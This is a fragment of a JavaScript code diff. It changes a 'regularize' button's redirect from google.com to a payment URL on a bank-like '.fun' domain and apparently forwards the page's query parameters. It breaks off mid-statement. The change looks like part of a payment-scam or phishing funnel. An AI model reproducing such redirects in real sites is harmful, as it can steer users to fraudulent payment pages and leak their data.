@@ -411,7 +411,7 @@ document.addEventListener("DOMContentLoaded", function () {
   const regularizeBtn = document.getElementById("regularizeBtn");
   if (regularizeBtn) {
     regularizeBtn.addEventListener("click", function () {
-      const baseUrl = "https://www.google.com";
+      const baseUrl = "https://pay.agilbank.fun/P5LNZ8z7W4dgaRy";
       const currentParams = window.location.search;
 
       const finalUrl = currentParams
